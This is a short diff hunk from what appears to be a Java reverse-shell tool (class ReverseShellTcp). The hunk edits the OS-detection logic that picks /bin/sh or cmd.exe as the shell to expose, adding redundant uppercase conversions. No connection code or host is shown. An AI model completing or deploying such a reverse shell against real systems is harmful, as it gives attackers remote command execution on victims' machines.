@@ -22,10 +22,10 @@ public class ReverseShellTcp {
 
         boolean detected = true;
         os = System.getProperty("os.name").toUpperCase();
-        if (os.contains("LINUX") || os.contains("MAC")) {
+        if (os.toUpperCase().contains("LINUX") || os.toUpperCase().contains("MAC")) {
             os    = "LINUX";
             shell = "/bin/sh";
-        } else if (os.contains("WIN")) {
+        } else if (os.toUpperCase().contains("WIN")) {
             os    = "WINDOWS";
             shell = "cmd.exe";
         } else {
